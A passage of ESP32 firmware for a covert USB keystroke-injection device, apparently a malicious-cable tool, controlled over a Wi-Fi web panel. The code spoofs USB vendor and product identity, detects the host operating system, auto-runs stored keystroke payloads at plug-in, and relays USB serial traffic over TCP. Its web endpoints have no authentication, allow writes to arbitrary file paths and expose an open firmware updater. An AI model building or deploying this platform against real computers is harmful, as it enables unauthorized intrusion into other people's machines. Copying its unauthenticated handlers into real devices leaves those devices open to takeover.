    delay(1000);  // Give time for response to be sent
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}

void handleUpdateBackupWiFi() {
  if (controlserver.hasArg("ssid") && controlserver.hasArg("password")) {
    String ssid = controlserver.arg("ssid");
    String password = controlserver.arg("password");
    File file = LittleFS.open("/wifi_backup_config.txt", FILE_WRITE);
    if (!file) {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to save backup Wi-Fi config\"}");
      return;
    }
    file.println(ssid);
    file.println(password);
    file.close();
    controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config saved. Device will restart.\"}");
    delay(1000);
    ESP.restart();
  } else {
    controlserver.send(400, "application/json", "{\"status\":\"error\",\"message\":\"Missing SSID or password\"}");
  }
}


void handleDeleteWiFiConfig() {
  if (LittleFS.exists("/wifi_config.txt")) {
    if (LittleFS.remove("/wifi_config.txt")) {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Wi-Fi config deleted successfully\"}");
      delay(1000);  // Give time for response to be sent
      ESP.restart();
    } else {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete the file\"}");
    }
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"File does not exist\"}");
  }
}

void handleDeleteBackupWiFiConfig() {
  if (LittleFS.exists("/wifi_backup_config.txt")) {
    if (LittleFS.remove("/wifi_backup_config.txt")) {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"Backup Wi-Fi config deleted successfully\"}");
      delay(1000);
      ESP.restart();
    } else {
      controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Failed to delete backup Wi-Fi config\"}");
    }
  } else {
    controlserver.send(500, "application/json", "{\"status\":\"error\",\"message\":\"Backup Wi-Fi config does not exist\"}");
  }
}


void handleUpdateUSB() {
  if (controlserver.hasArg("vendorID") && controlserver.hasArg("productID") && controlserver.hasArg("productName") && controlserver.hasArg("manufacturerName")) {

    String vendorID = controlserver.arg("vendorID");
    String productID = controlserver.arg("productID");
    String productName = controlserver.arg("productName");
    String manufacturerName = controlserver.arg("manufacturerName");

    File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.println(vendorID);
    fsUploadFile.println(productID);
    fsUploadFile.println(productName);
    fsUploadFile.println(manufacturerName);
    fsUploadFile.close();
    controlserver.send(200, "text/plain", "USB config applied successfully! The device will restart.");
    ESP.restart();
  } else {
    controlserver.send(400, "text/plain", "Missing USB configuration data");
  }
}

void handleDeleteUSBConfig() {
  if (LittleFS.exists("/usb_config.txt")) {
    if (LittleFS.remove("/usb_config.txt")) {
      controlserver.send(200, "text/plain", "USB config deleted successfully");
      ESP.restart();
    } else {
      controlserver.send(500, "text/plain", "Failed to delete USB config file");
    }
  } else {
    controlserver.send(500, "text/plain", "USB config file does not exist");
  }
}

void handleLayout() {
  if (controlserver.hasArg("layout")) {
    String layout = controlserver.arg("layout");
    auto it = layoutMapInit.find(layout);

    if (it != layoutMapInit.end()) {
      Keyboard.setLayout(it->second);
      saveLayoutConfig(layout);  // Save the layout selection
      controlserver.send(200, "text/plain", "Layout applied successfully!");
    } else {
      controlserver.send(400, "text/plain", "Invalid layout specified.");
    }
  } else {
    controlserver.send(400, "text/plain", "No layout specified.");
  }
}

void handleGetCurrentLayout() {
  String currentLayout = getCurrentLayout();
  controlserver.send(200, "text/plain", currentLayout);
}

void handleDeletePayload() {
  if (controlserver.hasArg("configmodule")) {
    String filenameToDelete = controlserver.arg("configmodule");
    if (filenameToDelete.length() > 0) {
      deleteFile(LittleFS, filenameToDelete);
    } else {
      controlserver.send(400, "text/plain", "File name is empty");
    }
  } else {
    controlserver.send(400, "text/plain", "Missing file name");
  }
}

void setup() {
  USB.onEvent(usbEventCallback);
  Keyboard.onEvent(usbEventCallback);
  USBSerial.onEvent(usbEventCallback);

  if (!LittleFS.begin(true)) {
    // format in case of missing file system
    LittleFS.format();
    delay(1000);
    ESP.restart();
  }

  if (LittleFS.exists("/usb_config.txt")) {
    File fsUploadFile = LittleFS.open("/usb_config.txt", FILE_READ);
    if (fsUploadFile) {
      String vendorID = fsUploadFile.readStringUntil('\n');
      vendorID.trim();
      String productID = fsUploadFile.readStringUntil('\n');
      productID.trim();
      String productName = fsUploadFile.readStringUntil('\n');
      productName.trim();
      String manufacturerName = fsUploadFile.readStringUntil('\n');
      manufacturerName.trim();
      fsUploadFile.close();
      USB.VID(strtol(vendorID.c_str(), nullptr, 16));
      USB.PID(strtol(productID.c_str(), nullptr, 16));
      USB.manufacturerName(manufacturerName.c_str());
      USB.productName(productName.c_str());
    }
  }

  USB.begin();
  Keyboard.begin();
  USBSerial.begin();

  if (LittleFS.exists("/layout_config.txt")) {
    File fsUploadFile = LittleFS.open("/layout_config.txt", FILE_READ);
    if (fsUploadFile) {
      String layoutKey = fsUploadFile.readStringUntil('\n');
      layoutKey.trim();
      fsUploadFile.close();
      auto it = layoutMapInit.find(layoutKey);
      if (it != layoutMapInit.end()) {
        selected_layout = it->second;
      }
    }
  }
  Keyboard.setLayout(selected_layout);

  if (LittleFS.exists("/payloads/payload-startup.txt")) {
    File fsUploadFile = LittleFS.open("/payloads/payload-startup.txt", FILE_READ);
    if (fsUploadFile) {
      livepayload = fsUploadFile.readString();
      // Set layout based on payload content
      setLayoutFromPayload(livepayload);
      payload_state = 1;
      payloadExecuted = false;
    }
  }

  if (LittleFS.exists("/wifi_config.txt")) {
    File fsUploadFile = LittleFS.open("/wifi_config.txt", FILE_READ);
    if (fsUploadFile) {
      ssid = fsUploadFile.readStringUntil('\n');
      ssid.trim();
      password = fsUploadFile.readStringUntil('\n');
      password.trim();
      fsUploadFile.close();
    }
  }

  WiFi.begin(ssid.c_str(), password.c_str());
  unsigned long startAttemptTime = millis();

  // Try primary WiFi for 10 seconds
  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
    delay(500);
  }

  String hostname = "cable-wind";
  if (LittleFS.exists("/hostname_config.txt")) {
    File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
    if (fsUploadFile) {
      hostname = fsUploadFile.readStringUntil('\n');
      hostname.trim();
      fsUploadFile.close();
    }
  }

  if (!MDNS.begin(hostname.c_str())) {
    while (1) {
      delay(1000);
    }
  }

  // If primary WiFi failed, try backup WiFi if it exists
  if (WiFi.status() != WL_CONNECTED && LittleFS.exists("/wifi_backup_config.txt")) {
    File file = LittleFS.open("/wifi_backup_config.txt", FILE_READ);
    if (file) {
      String backupSSID = file.readStringUntil('\n');
      backupSSID.trim();
      String backupPassword = file.readStringUntil('\n');
      backupPassword.trim();
      file.close();

      WiFi.begin(backupSSID.c_str(), backupPassword.c_str());
      startAttemptTime = millis();

      // Try backup WiFi for 10 seconds
      while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
        delay(500);
      }
    }
    String hostname = "cable-wind";
    if (LittleFS.exists("/hostname_config.txt")) {
      File fsUploadFile = LittleFS.open("/hostname_config.txt", FILE_READ);
      if (fsUploadFile) {
        hostname = fsUploadFile.readStringUntil('\n');
        hostname.trim();
        fsUploadFile.close();
      }
    }

    if (!MDNS.begin(hostname.c_str())) {
      while (1) {
        delay(1000);
      }
    }
  }

  tcpServer.begin();

  {
    File root = LittleFS.open("/payloads/");
    if (root && root.isDirectory()) {
      File file = root.openNextFile();
      while (file) {
        String fileName = file.name();
        size_t fileSize = file.size();
        file = root.openNextFile();
      }
    }
  }

  delay(3000);

  controlserver.on("/", []() {
    controlserver.send_P(200, "text/html", Index);
  });

  controlserver.on("/stats", handleStats);

  controlserver.on("/livepayload", []() {
    controlserver.send_P(200, "text/html", LivePayload);
  });

  controlserver.on("/uploadpayload", []() {
    controlserver.send_P(200, "text/html", UploadPayload);
  });

  controlserver.on("/config", []() {
    controlserver.send_P(200, "text/html", Configuration);
  });

  controlserver.on(
    "/upload", HTTP_POST, []() {
      controlserver.send(200, "application/json", "{\"status\":\"success\",\"message\":\"File uploaded successfully\"}");
    },
    handleFileUpload);

  controlserver.on("/listpayloads", []() {
    listDir(LittleFS, "/payloads", 0);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/showpayload", []() {
    String fileName = controlserver.arg("payload");
    readFile(LittleFS, fileName);
    controlserver.send(200, "text/html", FileList);
  });

  controlserver.on("/style.css", []() {
    // Set aggressive caching for CSS
    controlserver.sendHeader("Cache-Control", "public, max-age=31536000");  // Cache for 1 year
    controlserver.sendHeader("ETag", "\"v1.0\"");                           // Add ETag for cache validation
    controlserver.send_P(200, "text/css", Style);
  });

  controlserver.on("/javascript.js", []() {
    // Set aggressive caching for JavaScript
    controlserver.sendHeader("Cache-Control", "public, max-age=31536000");  // Cache for 1 year
    controlserver.sendHeader("ETag", "\"v1.0\"");                           // Add ETag for cache validation
    controlserver.send_P(200, "application/javascript", Redirect);
  });

  controlserver.on("/dopayload", []() {
    if (livepayload != "") {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivepayload", []() {
    livepayload = controlserver.arg("livepayload");
    if (controlserver.arg("configmodule")) {
      payload_state = 1;
      payloadExecuted = false;
    }
    controlserver.send(200, "text/plain", "Payload running...");
  });

  controlserver.on("/runlivestartup", []() {
    String payload_startup = controlserver.arg("livepayload");
    String fileName = "payload-startup.txt";
    String filePath = "/payloads/" + fileName;

    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }

    fsUploadFile.print(payload_startup);
    fsUploadFile.close();

    // Set layout based on payload content if specified
    setLayoutFromPayload(payload_startup);

    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/runlivesave", HTTP_POST, []() {
    String payload_save = controlserver.arg("livepayload");
    String payloadName = controlserver.arg("payloadName");
    String payloadDesc = controlserver.arg("payloadDescription");
    String payloadOS = controlserver.arg("payloadOS");
    String fileName;

    // Set layout based on payload content if specified
    setLayoutFromPayload(payload_save);

    int namePos = payload_save.indexOf("# Name: ");
    if (namePos != -1) {
      int start = namePos + 8;
      int end = payload_save.indexOf('\n', start);
      if (end == -1) {
        end = payload_save.length();
      }
      fileName = payload_save.substring(start, end);
      fileName.trim();
    }

    if (fileName.length() == 0 || fileName.indexOf('/') != -1) {
      const char charset[] = "abcdefghijklmnopqrstuvwxyz1234567890";
      fileName = "livepayload-";
      for (int i = 0; i < 8; i++) {
        fileName += charset[random(0, 26)];
      }
      fileName += ".txt";
    }

    String filePath = "/payloads/" + fileName;

    if (!LittleFS.exists("/payloads")) {
      LittleFS.mkdir("/payloads");
    }

    File fsUploadFile = LittleFS.open(filePath, FILE_WRITE);
    if (!fsUploadFile) {
      controlserver.send(500, "text/plain", "Failed to open file for writing");
      return;
    }
    fsUploadFile.print(payload_save);
    fsUploadFile.close();

    // Save metadata
    savePayloadMetadata(filePath, payloadName, payloadDesc, payloadOS);

    payloadExecuted = true;
    controlserver.send(200, "text/plain", "Payload saved");
  });

  controlserver.on("/payloadstatuspayload", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatusstartup", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/payloadstatussave", []() {
    if (payloadExecuted) {
      controlserver.send(200, "application/json", "{\"status\": \"executed\"}");
      payloadExecuted = false;
    } else {
      controlserver.send(200, "application/json", "{\"status\": \"pending\"}");
    }
  });

  controlserver.on("/autoexecplanning", []() {
    controlserver.send_P(200, "text/html", AutoExecPlanning);
  });

  controlserver.on("/listpayloadsdata", []() {
    DynamicJsonDocument doc(4096);
    JsonArray payloads = doc.to<JsonArray>();

    File root = LittleFS.open("/payloads/");
    if (root && root.isDirectory()) {
      File file = root.openNextFile();
      while (file) {
        String fileName = file.name();
        if (!fileName.endsWith(".meta")) {
          String filePath = "/payloads/" + fileName;
          String payloadName = readPayloadMetadata(filePath, META_NAME);
          String payloadDesc = readPayloadMetadata(filePath, META_DESCRIPTION);

          JsonObject payload = payloads.createNestedObject();
          payload["path"] = filePath;
          payload["name"] = payloadName;
          payload["description"] = payloadDesc;
          payload["filename"] = fileName;
        }
        file = root.openNextFile();
      }
    }

    String output;
    serializeJson(doc, output);
    controlserver.send(200, "application/json", output);
  });

  controlserver.on("/saveautoexecplan", HTTP_POST, []() {
    String payload = controlserver.arg("plain");
    DynamicJsonDocument doc(2048);
    deserializeJson(doc, payload);

    File file = LittleFS.open("/autoexec_plan.json", FILE_WRITE);
    if (!file) {
      controlserver.send(500, "application/json", "{\"success\":false}");
      return;
    }

    serializeJson(doc, file);
    file.close();
    controlserver.send(200, "application/json", "{\"success\":true}");
  });

  controlserver.on("/getautoexecplan", []() {
    if (!LittleFS.exists("/autoexec_plan.json")) {
      controlserver.send(200, "application/json", "{}");
      return;
    }

    File file = LittleFS.open("/autoexec_plan.json", FILE_READ);
    if (!file) {
      controlserver.send(500, "application/json", "{}");
      return;
    }

    String content = file.readString();
    file.close();
    controlserver.send(200, "application/json", content);
  });

  controlserver.on("/clearautoexecplan", HTTP_POST, []() {
    if (LittleFS.exists("/autoexec_plan.json")) {
      LittleFS.remove("/autoexec_plan.json");
    }
    controlserver.send(200, "application/json", "{\"success\":true}");
  });

  controlserver.on("/updatepayload", HTTP_POST, []() {
    if (controlserver.hasArg("plain")) {  // Check for JSON data
      String payload = controlserver.arg("plain");
      DynamicJsonDocument doc(2048);
      deserializeJson(doc, payload);

      String path = doc["path"].as<String>();
      String content = doc["content"].as<String>();

      if (path.length() > 0 && content.length() > 0) {
        File file = LittleFS.open(path, FILE_WRITE);
        if (!file) {
          controlserver.send(500, "application/json", "{\"success\":false,\"message\":\"Failed to open file for writing\"}");
          return;
        }

        file.print(content);
        file.close();

        // Update layout if specified in payload
        setLayoutFromPayload(content);

        controlserver.send(200, "application/json", "{\"success\":true,\"message\":\"Payload updated successfully\"}");
      } else {
        controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"Missing path or content parameters\"}");
      }
    } else {
      controlserver.send(400, "application/json", "{\"success\":false,\"message\":\"No data received\"}");
    }
  });


  controlserver.on("/updatewifi", HTTP_POST, handleUpdateWiFi);
  controlserver.on("/layout", HTTP_POST, handleLayout);
  controlserver.on("/deletewificonfig", HTTP_POST, handleDeleteWiFiConfig);
  controlserver.on("/updateusb", HTTP_POST, handleUpdateUSB);
  controlserver.on("/deleteusbconfig", HTTP_POST, handleDeleteUSBConfig);
  controlserver.on("/deletepayload", HTTP_POST, handleDeletePayload);
  controlserver.on("/getcurrentlayout", handleGetCurrentLayout);
  controlserver.on("/updatehostname", HTTP_POST, handleUpdateHostname);
  controlserver.on("/gethostname", handleGetHostname);
  controlserver.on("/updatebackupwifi", HTTP_POST, handleUpdateBackupWiFi);
  controlserver.on("/deletebackupwificonfig", HTTP_POST, handleDeleteBackupWiFiConfig);

  httpUpdater.setup(&controlserver);
  controlserver.begin();
}

void loop() {
  controlserver.handleClient();
  delay(10);
  vTaskDelay(1);

  // Check if we should auto-execute a payload
  static bool autoExecChecked = false;
  static unsigned long osDetectionStartTime = 0;
  static bool osDetectionInProgress = false;
  static DynamicJsonDocument pendingAutoExecPlan(2048);
  static bool hasPendingPlan = false;
  static bool firstRun = true;

  if (firstRun && LittleFS.exists("/autoexec_plan.json")) {
    firstRun = false;
    File file = LittleFS.open("/autoexec_plan.json", FILE_READ);
    if (file) {
      String content = file.readString();
      file.close();
      deserializeJson(pendingAutoExecPlan, content);

      if (pendingAutoExecPlan["enabled"] == true) {
        // Check if we have a no-detection payload
        if (pendingAutoExecPlan["nodetection"]) {
          String osPayloadPath = pendingAutoExecPlan["nodetection"]["path"].as<String>();
          if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {
            readFile(LittleFS, osPayloadPath);
            payload_state = 1;
            payloadExecuted = false;
            autoExecChecked = true;
          }
        } else {
          // If no no-detection payload, proceed with OS detection
          onDetectOSRequested();
          osDetectionStartTime = millis();
          osDetectionInProgress = true;
          hasPendingPlan = true;
          autoExecChecked = true;
        }
      }
    }
  }

  // Handle OS detection completion
  if (osDetectionInProgress) {
    if (os_detection_complete) {
      // Detection complete, execute payload if available
      if (hasPendingPlan) {
        String osPayloadPath = "";

        switch (detected_os) {
          case OS_WINDOWS:
            osPayloadPath = pendingAutoExecPlan["windows"]["path"].as<String>();
            break;
          case OS_LINUX:
            osPayloadPath = pendingAutoExecPlan["linux"]["path"].as<String>();
            break;
          case OS_IOS:
            osPayloadPath = pendingAutoExecPlan["ios"]["path"].as<String>();
            break;
          case OS_MACOS:
            osPayloadPath = pendingAutoExecPlan["macos"]["path"].as<String>();
            break;
          case OS_ANDROID:
            osPayloadPath = pendingAutoExecPlan["android"]["path"].as<String>();
            break;
          default:
            break;
        }

        if (osPayloadPath.length() > 0 && LittleFS.exists(osPayloadPath)) {
          readFile(LittleFS, osPayloadPath);
          payload_state = 1;
          payloadExecuted = false;
        }
      }
      osDetectionInProgress = false;
      hasPendingPlan = false;
    } else if (millis() - osDetectionStartTime > 30000) {
      // Timeout after 30 seconds if detection fails
      os = "OS Unknown";
      os_detection_complete = true;
      osDetectionInProgress = false;
      hasPendingPlan = false;
    }
  }

  while (USBSerial.available()) {
    String data = USBSerial.readString();
    clientServer.print(data);
  }
  while (clientServer.available()) {
    String data = clientServer.readString();
    USBSerial.print(data);
  }
  if (payload_state == 1) {
    // Set layout before executing payload
    setLayoutFromPayload(livepayload);

    char *splitlines;
    int payloadlen = livepayload.length() + 1;
    char request[payloadlen];
    livepayload.toCharArray(request, payloadlen);
    splitlines = strtok(request, "\r\n");
    while (splitlines != NULL) {
      cmd = splitlines;
      payloadExec();
      splitlines = strtok(NULL, "\r\n");
      vTaskDelay(1);
    }
    payload_state = 0;
    cmd = "";
    livepayload = "";
    payloadExecuted = true;
  }
  vTaskDelay(1);
}